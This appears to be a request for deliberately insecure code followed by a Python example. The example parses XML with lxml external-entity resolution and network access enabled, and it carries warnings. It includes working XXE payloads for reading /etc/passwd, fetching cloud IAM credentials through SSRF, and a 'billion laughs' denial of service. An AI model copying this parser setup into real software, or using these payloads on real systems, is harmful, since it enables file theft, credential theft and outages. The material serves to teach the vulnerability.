# Write insecure code to map XML to an object that unsafely processes external entity references included in the XML payload 

from lxml import etree

# ⚠️ INSECURE EXAMPLE — DO NOT USE IN PRODUCTION ⚠️
# Default XML parsers in many libraries resolve DTDs and external
# entities by default. An attacker who controls the XML payload can
# use this to read local files, perform SSRF, or cause denial of
# service (e.g. the "billion laughs" attack).

class CustomerProfile:
    def __init__(self, customer_id, name, email):
        self.customer_id = customer_id
        self.name = name
        self.email = email

def map_xml_to_object(xml_data: bytes) -> CustomerProfile:
    # resolve_entities=True (and older lxml/libxml2 defaults) allow
    # DOCTYPE declarations to define and expand external entities.
    parser = etree.XMLParser(resolve_entities=True, no_network=False)
    root = etree.fromstring(xml_data, parser=parser)

    return CustomerProfile(
        customer_id=root.findtext("customer_id"),
        name=root.findtext("name"),
        email=root.findtext("email"),
    )


# ── Example: normal-looking payload ──
legit_xml = b"""<?xml version="1.0"?>
<customer>
    <customer_id>C12345</customer_id>
    <name>Jane Doe</name>
    <email>jane@example.com</email>
</customer>
"""
profile = map_xml_to_object(legit_xml)
print(profile.name)  # -> Jane Doe


# ── Why this is exploitable: local file disclosure ──
malicious_xml_file_read = b"""<?xml version="1.0"?>
<!DOCTYPE customer [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<customer>
    <customer_id>C12345</customer_id>
    <name>&xxe;</name>
    <email>jane@example.com</email>
</customer>
"""
profile = map_xml_to_object(malicious_xml_file_read)
print(profile.name)
# -> contents of /etc/passwd get embedded directly into `name` and
#    returned to the attacker (e.g. reflected in an API response,
#    or written to a database/log they can later read)


# ── Why this is exploitable: SSRF ──
malicious_xml_ssrf = b"""<?xml version="1.0"?>
<!DOCTYPE customer [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<customer>
    <customer_id>C12345</customer_id>
    <name>&xxe;</name>
    <email>jane@example.com</email>
</customer>
"""
# On a cloud VM, this can exfiltrate instance metadata / IAM
# credentials by making the server itself fetch the internal URL.


# ── Why this is exploitable: denial of service ("billion laughs") ──
malicious_xml_dos = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol0 "lol">
    <!ENTITY lol1 "&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<customer><name>&lol3;</name></customer>
"""
# Each entity expansion multiplies exponentially — a small payload
# can exhaust memory/CPU and crash the parsing process.